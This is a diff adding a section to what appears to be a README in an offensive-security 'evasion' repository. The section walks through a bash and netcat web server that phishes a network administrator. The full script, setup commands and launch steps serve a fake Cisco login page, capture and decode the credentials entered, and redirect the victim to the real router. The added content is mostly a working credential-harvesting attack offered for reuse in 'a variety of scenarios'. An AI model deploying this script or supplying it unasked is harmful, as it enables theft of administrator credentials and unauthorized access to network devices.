@@ -167,6 +167,115 @@ Lure the victim to request the URL, where www.my.lab is the attacking host runni
 
 This example shows how to setup a lightweight web server using bash and netcat to phish a user name and password from a network administrator.  In this example a fake login page is served to a user; once the credentials are captured the user is redirected to a real device.  This technique can be modified to suit a variety of scenarios.  
 
+**Create a directory for the script and files**
+
+```
+mkdir -p /root/scripts/web_creds
+cd /root/scripts/web_creds
+```
+
 **Create the HTML for the fake login page**
 
-The page used in this example can be found [here](https://github.com/billchaison/evasion/blob/master/cisco.html.zip)
+The page used in this example can be found [here](https://github.com/billchaison/evasion/blob/master/cisco.html.zip)<br />
+The uncompressed file will be saved to `/root/scripts/web_creds/cisco.html` in this example.
+
+**Create the web server script**
+
+The script will be `/root/scripts/web_creds/web_creds.sh`
+
+```bash
+#!/usr/bin/bash
+
+# harvest credentials using a fake login page followed by
+# redirect to legitimate site.  for example, lure a victim
+# to log onto a fake router admin page then redirect to a
+# real device.
+
+# minimal web server using bash and netcat.
+# change variables to suit your environment.
+
+# the adapter IP address nc will bind to
+NC_BIND_ADDR=192.168.1.242
+# the TCP port nc will listen on
+NC_BIND_PORT=80
+# the resource path the victim will be lured to
+RESOURCE_GET=/admin/logon
+# the 302 redirect to a real device login page
+REDIRECT_URL=http://192.168.1.1/Main_Login.asp
+# the GET form action used in WEBCRED_FILE when credentials are supplied
+# (using GET instead of POST because of absence of line buffered POST data)
+WEBCRED_GET=/session/logon_51aa0e6a
+# local HTML file containing fake authentication portal
+WEBCRED_FILE=/root/scripts/web_creds/cisco.html
+
+MY_HOST_FQDN=$(hostname -f)
+WEBCRED_SIZE=$(stat -c %s $WEBCRED_FILE | tr -d [\r\n])
+
+echo -e "Lure victim to:\nhttp://$NC_BIND_ADDR:$NC_BIND_PORT$RESOURCE_GET\nhttp://$MY_HOST_FQDN:$NC_BIND_PORT$RESOURCE_GET\n"
+
+function urldecode {
+   echo $@ | sed "s@+@ @g;s@%@\\\\x@g" | xargs -0 printf "%b"
+}
+
+while true
+do
+   mkfifo webcreds_wr >/dev/null 2>&1
+   mkfifo webcreds_rd >/dev/null 2>&1
+   FLAG=0
+   nc -nl -s $NC_BIND_ADDR -p $NC_BIND_PORT >webcreds_rd < <(cat webcreds_wr) 2>/dev/null &
+   NCPID=$!
+   while read line <webcreds_rd
+   do
+      if [ $FLAG -eq 0 ]
+      then
+         FLAG=1
+         (sleep 5; if [ -d "/proc/$NCPID" ]; then kill $NCPID; rm -f webcreds_rd; mkfifo webcreds_rd >/dev/null 2>&1; fi)&
+      fi
+      if echo "$line" | grep $RESOURCE_GET | grep -vi Referer >/dev/null 2>&1
+      then
+         HTTP_RESP_1="HTTP/1.1 200 OK"
+         HTTP_RESP_2="Server: Apache/2.4"
+         HTTP_RESP_3="Date: $(date -u | sed 's/AM \|PM //' | sed 's/UTC/GMT/' | sed 's/ /, /')"
+         HTTP_RESP_4="Content-Length: $WEBCRED_SIZE"
+         HTTP_RESP_5="Connection: close"
+         HTTP_RESP_6="Content-Type: text/html"
+         HTTP_RESP_7=$(cat $WEBCRED_FILE)
+         printf "%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n\r\n%s" "$HTTP_RESP_1" "$HTTP_RESP_2" "$HTTP_RESP_3" "$HTTP_RESP_4" "$HTTP_RESP_5" "$HTTP_RESP_6" "$HTTP_RESP_7" >webcreds_wr
+         sleep 1
+         kill $NCPID >/dev/null 2>&1
+         break
+      fi
+      if echo "$line" | grep $WEBCRED_GET >/dev/null 2>&1
+      then
+         date
+         echo $line
+         echo -n "[decoded] "
+         urldecode "$line"
+         echo ============================================================
+         HTTP_RESP_1="HTTP/1.1 302 Found"
+         HTTP_RESP_2="Location: $REDIRECT_URL"
+         printf "%s\r\n%s\r\n\r\n" "$HTTP_RESP_1" "$HTTP_RESP_2" > webcreds_wr
+         sleep 1
+         kill $NCPID >/dev/null 2>&1
+         break
+      fi
+   done
+done
+```
+
+**Launching the attack**
+
+Run the script `./web_creds.sh` you will see the following output.<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/wc01.png)
+
+Once the user accesses `http://192.168.1.242:80/admin/logon` the following page will be returned.<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/wc02.png)
+
+The user provides credentials into the form fields then clicks on the Login button.<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/wc03.png)
+
+The user is redirected to a real device's login page.<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/wc04.png)
+
+The script prints the captured credentials then waits for other login attempts.<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/wc05.png)
